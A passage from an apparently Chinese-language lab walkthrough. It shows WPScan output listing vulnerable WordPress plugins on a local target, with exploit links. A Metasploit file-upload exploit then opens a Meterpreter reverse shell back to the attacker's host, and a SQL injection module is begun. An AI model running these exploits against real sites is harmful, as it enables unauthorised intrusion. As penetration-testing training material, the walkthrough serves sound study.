https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6573</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6574</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6575</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6576</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6577</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6578</span></span><br><span class="line"><span class="string"> |      - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.0 (100% confidence)</span></span><br><span class="line"><span class="string"> | Detected By: Readme - Stable Tag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.138/wordpress/wp-content/plugins/mail-masta/readme.txt</span></span><br><span class="line"><span class="string"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.138/wordpress/wp-content/plugins/mail-masta/readme.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] reflex-gallery</span></span><br><span class="line"><span class="string"> | Location: http://192.168.116.138/wordpress/wp-content/plugins/reflex-gallery/</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-05-10T16:05:00.000Z</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 3.1.7</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Detected By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] 2 vulnerabilities identified:</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: Reflex Gallery &lt;= 3.1.3 - Arbitrary File Upload</span></span><br><span class="line"><span class="string"> |     Fixed in: 3.1.4</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/7867</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4133</span></span><br><span class="line"><span class="string"> |      - https://www.exploit-db.com/exploits/36374/</span></span><br><span class="line"><span class="string"> |      - https://packetstormsecurity.com/files/130845/</span></span><br><span class="line"><span class="string"> |      - https://packetstormsecurity.com/files/131515/</span></span><br><span class="line"><span class="string"> |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: Multiple Plugins - jQuery prettyPhoto DOM Cross-Site Scripting (XSS)</span></span><br><span class="line"><span class="string"> |     Fixed in: 3.1.5</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/7985</span></span><br><span class="line"><span class="string"> |      - https://blog.anantshri.info/forgotten_disclosure_dom_xss_prettyphoto</span></span><br><span class="line"><span class="string"> |      - https://github.com/scaron/prettyphoto/issues/149</span></span><br><span class="line"><span class="string"> |      - https://github.com/wpscanteam/wpscan/issues/818</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 3.1.3 (80% confidence)</span></span><br><span class="line"><span class="string"> | Detected By: Readme - Stable Tag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.138/wordpress/wp-content/plugins/reflex-gallery/readme.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] site-editor</span></span><br><span class="line"><span class="string"> | Location: http://192.168.116.138/wordpress/wp-content/plugins/site-editor/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.1.1 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2017-05-02T23:34:00.000Z</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Detected By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] 1 vulnerability identified:</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: Site Editor &lt;= 1.1.1 - Local File Inclusion (LFI)</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/9044</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422</span></span><br><span class="line"><span class="string"> |      - http://seclists.org/fulldisclosure/2018/Mar/40</span></span><br><span class="line"><span class="string"> |      - https://github.com/SiteEditor/editor/issues/2</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.1.1 (80% confidence)</span></span><br><span class="line"><span class="string"> | Detected By: Readme - Stable Tag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.138/wordpress/wp-content/plugins/site-editor/readme.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] slideshow-gallery</span></span><br><span class="line"><span class="string"> | Location: http://192.168.116.138/wordpress/wp-content/plugins/slideshow-gallery/</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-07-12T13:09:00.000Z</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 1.6.12</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Detected By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] 5 vulnerabilities identified:</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: Slideshow Gallery &lt; 1.4.7 Arbitrary File Upload</span></span><br><span class="line"><span class="string"> |     Fixed in: 1.4.7</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/7532</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460</span></span><br><span class="line"><span class="string"> |      - https://www.exploit-db.com/exploits/34681/</span></span><br><span class="line"><span class="string"> |      - https://www.exploit-db.com/exploits/34514/</span></span><br><span class="line"><span class="string"> |      - http://seclists.org/bugtraq/2014/Sep/1</span></span><br><span class="line"><span class="string"> |      - https://packetstormsecurity.com/files/131526/</span></span><br><span class="line"><span class="string"> |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: Tribulant Slideshow Gallery &lt;= 1.5.3 - Arbitrary file upload &amp; Cross-Site Scripting (XSS) </span></span><br><span class="line"><span class="string"> |     Fixed in: 1.5.3.4</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/8263</span></span><br><span class="line"><span class="string"> |      - http://cinu.pl/research/wp-plugins/mail_5954cbf04cd033877e5415a0c6fba532.html</span></span><br><span class="line"><span class="string"> |      - http://blog.cinu.pl/2015/11/php-static-code-analysis-vs-top-1000-wordpress-plugins.html</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: Tribulant Slideshow Gallery &lt;= 1.6.4 - Authenticated Cross-Site Scripting (XSS)</span></span><br><span class="line"><span class="string"> |     Fixed in: 1.6.5</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/8786</span></span><br><span class="line"><span class="string"> |      - https://sumofpwn.nl/advisory/2016/cross_site_scripting_vulnerability_in_tribulant_slideshow_galleries_wordpress_plugin.html</span></span><br><span class="line"><span class="string"> |      - https://plugins.trac.wordpress.org/changeset/1609730/slideshow-gallery</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: Slideshow Gallery &lt;= 1.6.5 - Multiple Authenticated Cross-Site Scripting (XSS)</span></span><br><span class="line"><span class="string"> |     Fixed in: 1.6.6</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/8795</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17946</span></span><br><span class="line"><span class="string"> |      - http://www.defensecode.com/advisories/DC-2017-01-014_WordPress_Tribulant_Slideshow_Gallery_Plugin_Advisory.pdf</span></span><br><span class="line"><span class="string"> |      - https://packetstormsecurity.com/files/142079/DC-2017-01-014.pdf</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: Slideshow Gallery &lt;= 1.6.8 - XSS and SQLi</span></span><br><span class="line"><span class="string"> |     Fixed in: 1.6.9</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/9354</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18017</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18018</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18019</span></span><br><span class="line"><span class="string"> |      - https://plugins.trac.wordpress.org/changeset?reponame=&amp;new=1974812%40slideshow-gallery&amp;old=1907382%40slideshow-gallery</span></span><br><span class="line"><span class="string"> |      - https://ansawaf.blogspot.com/2019/04/xss-and-sqli-in-slideshow-gallery.html</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.4.6 (100% confidence)</span></span><br><span class="line"><span class="string"> | Detected By: Readme - Stable Tag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.138/wordpress/wp-content/plugins/slideshow-gallery/readme.txt</span></span><br><span class="line"><span class="string"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.138/wordpress/wp-content/plugins/slideshow-gallery/readme.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] wp-easycart-data</span></span><br><span class="line"><span class="string"> | Location: http://192.168.116.138/wordpress/wp-content/plugins/wp-easycart-data/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Detected By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | The version could not be determined.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] wp-support-plus-responsive-ticket-system</span></span><br><span class="line"><span class="string"> | Location: http://192.168.116.138/wordpress/wp-content/plugins/wp-support-plus-responsive-ticket-system/</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-09-03T07:57:00.000Z</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 9.1.2</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Detected By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] 4 vulnerabilities identified:</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WP Support Plus Responsive Ticket System &lt;= 7.1.3 – Authenticated SQL Injection</span></span><br><span class="line"><span class="string"> |     Fixed in: 8.0.0</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/8699</span></span><br><span class="line"><span class="string"> |      - https://www.exploit-db.com/exploits/40939/</span></span><br><span class="line"><span class="string"> |      - http://lenonleite.com.br/en/blog/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/</span></span><br><span class="line"><span class="string"> |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WP Support Plus Responsive Ticket System &lt;= 8.0.7 - Remote Code Execution (RCE)</span></span><br><span class="line"><span class="string"> |     Fixed in: 8.0.8</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/8949</span></span><br><span class="line"><span class="string"> |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WP Support Plus Responsive Ticket System &lt;= 9.0.2 - Multiple Authenticated SQL Injection</span></span><br><span class="line"><span class="string"> |     Fixed in: 9.0.3</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/9041</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131</span></span><br><span class="line"><span class="string"> |      - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md</span></span><br><span class="line"><span class="string"> |      - https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WP Support Plus Responsive Ticket System &lt;= 9.1.1 - Stored XSS</span></span><br><span class="line"><span class="string"> |     Fixed in: 9.1.2</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/9235</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7299</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15331</span></span><br><span class="line"><span class="string"> |      - https://cert.kalasag.com.ph/news/research/cve-2019-7299-stored-xss-in-wp-support-plus-responsive-ticket-system/</span></span><br><span class="line"><span class="string"> |      - https://plugins.trac.wordpress.org/changeset/2024484/wp-support-plus-responsive-ticket-system</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 7.1.3 (100% confidence)</span></span><br><span class="line"><span class="string"> | Detected By: Readme - Stable Tag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.138/wordpress/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt</span></span><br><span class="line"><span class="string"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.138/wordpress/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] wp-symposium</span></span><br><span class="line"><span class="string"> | Location: http://192.168.116.138/wordpress/wp-content/plugins/wp-symposium/</span></span><br><span class="line"><span class="string"> | Last Updated: 2015-08-21T12:36:00.000Z</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 15.8.1</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Detected By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] 7 vulnerabilities identified:</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WP Symposium 13.04 - Unvalidated Redirect</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/6383</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2694</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WP Symposium &lt;= 12.07.07 - Authentication Bypass</span></span><br><span class="line"><span class="string"> |     Reference: https://wpvulndb.com/vulnerabilities/6390</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WP Symposium &lt;= 14.11 - Unauthenticated Shell Upload</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/7716</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-10021</span></span><br><span class="line"><span class="string"> |      - https://www.exploit-db.com/exploits/35543/</span></span><br><span class="line"><span class="string"> |      - https://www.exploit-db.com/exploits/35778/</span></span><br><span class="line"><span class="string"> |      - http://www.homelab.it/index.php/2014/12/11/wordpress-wp-symposium-shell-upload/</span></span><br><span class="line"><span class="string"> |      - https://www.youtube.com/watch?v=pF8lIuLT6Vs</span></span><br><span class="line"><span class="string"> |      - http://blog.sucuri.net/2014/12/wp-symposium-zero-day-vulnerability-dangers.html</span></span><br><span class="line"><span class="string"> |      - https://packetstormsecurity.com/files/129884/</span></span><br><span class="line"><span class="string"> |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_symposium_shell_upload</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WP Symposium &lt;= 15.1 - SQL Injection</span></span><br><span class="line"><span class="string"> |     Fixed in: 15.4</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/7902</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3325</span></span><br><span class="line"><span class="string"> |      - https://www.exploit-db.com/exploits/37080/</span></span><br><span class="line"><span class="string"> |      - http://web.archive.org/web/20150718010246/http://permalink.gmane.org/gmane.comp.security.oss.general/16479</span></span><br><span class="line"><span class="string"> |      - https://packetstormsecurity.com/files/131801/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WP Symposium &lt;=  15.5.1 - Unauthenticated SQL Injection</span></span><br><span class="line"><span class="string"> |     Fixed in: 15.8</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/8140</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6522</span></span><br><span class="line"><span class="string"> |      - https://www.exploit-db.com/exploits/37824/</span></span><br><span class="line"><span class="string"> |      - https://plugins.trac.wordpress.org/changeset/1214872/wp-symposium</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WP Symposium &lt;= 15.1 - Blind SQL Injection</span></span><br><span class="line"><span class="string"> |     Fixed in: 15.8</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/8148</span></span><br><span class="line"><span class="string"> |      - https://security.dxw.com/advisories/blind-sql-injection-in-wp-symposium-allows-unauthenticated-attackers-to-access-sensitive-data/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WP Symposium &lt;= 15.8.1 - Unauthenticated Reflected Cross-Site Scripting (XSS)</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/8175</span></span><br><span class="line"><span class="string"> |      - http://cxsecurity.com/issue/WLB-2015090024</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 15.1 (80% confidence)</span></span><br><span class="line"><span class="string"> | Detected By: Readme - Stable Tag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.138/wordpress/wp-content/plugins/wp-symposium/readme.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Config Backups - Time: 00:00:00 &lt;==================================================================================================================================================================&gt; (21 / 21) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Config Backups Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Wed Sep 25 22:23:25 2019</span></span><br><span class="line"><span class="string">[+] Requests Done: 78</span></span><br><span class="line"><span class="string">[+] Cached Requests: 5</span></span><br><span class="line"><span class="string">[+] Data Sent: 23.706 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 17.527 MB</span></span><br><span class="line"><span class="string">[+] Memory used: 207.039 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:03</span></span><br><span class="line"><span class="string">➜  ~</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>这次还真扫出来可以利用的漏洞了，文件包含，SQL注入，文件上传，RCE都有。</p>
</li>
<li><p>SQL注入的：</p>
</li>
</ul>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/hamkovic/Mail-Masta-Wordpress-Plugin-SQL-Injection-Vulnerability</span><br><span class="line">http<span class="variable">s:</span>//ansawaf.blogspot.<span class="keyword">com</span>/<span class="number">2019</span>/<span class="number">04</span>/xss-<span class="built_in">and</span>-sqli-in-slideshow-gallery.html</span><br><span class="line">http<span class="variable">s:</span>//www.exploit-db.<span class="keyword">com</span>/exploits/<span class="number">40939</span>/</span><br></pre></td></tr></table></figure>
<ul>
<li>文件包含的：</li>
</ul>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.exploit-db.com<span class="regexp">/exploits/</span><span class="number">40290</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure>
<ul>
<li>文件上传的：</li>
</ul>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.rapid7.com/db</span><span class="regexp">/modules/exploit</span><span class="regexp">/unix/webapp</span><span class="regexp">/wp_reflexgallery_file_upload</span></span><br><span class="line"><span class="regexp">https:/</span><span class="regexp">/www.exploit-db.com/exploits</span><span class="regexp">/36374/</span></span><br><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.exploit-db.com/exploits</span><span class="regexp">/34681/</span></span><br><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.exploit-db.com/exploits</span><span class="regexp">/34514/</span></span><br><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.rapid7.com/db</span><span class="regexp">/modules/exploit</span><span class="regexp">/unix/webapp</span><span class="regexp">/wp_slideshowgallery_upload</span></span><br><span class="line"><span class="regexp">https:/</span><span class="regexp">/www.rapid7.com/db</span><span class="regexp">/modules/exploit</span><span class="regexp">/unix/webapp</span><span class="regexp">/wp_symposium_shell_upload</span></span><br></pre></td></tr></table></figure>
<ul>
<li>绕过认证的：</li>
</ul>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="variable">s:</span>//plugins.trac.wordpress.org/changeset/<span class="number">1763596</span>/<span class="keyword">wp</span>-support-plus-responsive-ticket-<span class="built_in">system</span></span><br></pre></td></tr></table></figure>
<ul>
<li>利用链接，rapid7的在MSF里都可以直接利用，exp-db要手动测试。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ wpscan --enumerate p --url http://192.168.116.138/wordpress/ |grep exp   </span><br><span class="line"> |      - https://www.exploit-db.com/exploits/40290/</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/36374/</span><br><span class="line"> |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/34681/</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/34514/</span><br><span class="line"> |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/40939/</span><br><span class="line"> |      - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/35543/</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/35778/</span><br><span class="line"> |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_symposium_shell_upload</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/37080/</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/37824/</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>为了方便就直接使用MSF了，应该这几个都可以用。</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/wp_reflexgallery_file_upload):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     <span class="literal">no</span>        A<span class="built_in"> proxy </span>chain of format type:host:port[,type:host:port][<span class="built_in">..</span>.]</span><br><span class="line">   RHOSTS     192.168.116.138  <span class="literal">yes</span>       The target<span class="built_in"> address </span>range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT      80               <span class="literal">yes</span>       The target<span class="built_in"> port </span>(TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            <span class="literal">no</span>        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /wordpress       <span class="literal">yes</span>       The base path <span class="keyword">to</span> the wordpress application</span><br><span class="line">   VHOST                       <span class="literal">no</span>        HTTP<span class="built_in"> server </span>virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.116.1    <span class="literal">yes</span>       The listen<span class="built_in"> address </span>(an<span class="built_in"> interface </span>may be specified)</span><br><span class="line">   LPORT  7788             <span class="literal">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Reflex Gallery 3.1.3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) &gt; </span><br><span class="line">msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) &gt; <span class="builtin-name">run</span> </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.116.1:7788 </span><br><span class="line">[+] Our payload is at: QkwaQFsdu.php. Calling payload<span class="built_in">..</span>.</span><br><span class="line">[*] Calling payload<span class="built_in">..</span>.</span><br><span class="line">[*] Sending stage (38247 bytes) <span class="keyword">to</span> 192.168.116.138</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.116.1:7788 -&gt; 192.168.116.138:41290) at 2019-09-26 10:28:04 +0800</span><br><span class="line">[+] Deleted QkwaQFsdu.php</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><ul>
<li>连着把其他的都试一遍，第二个需要账号密码试不了。</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/wp_symposium_shell_upload) &gt; use auxiliary/admin/http/wp_symposium_sql_injection </span><br><span class="line">msf5 auxiliary(admin/http/wp_symposium_sql_injection) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options 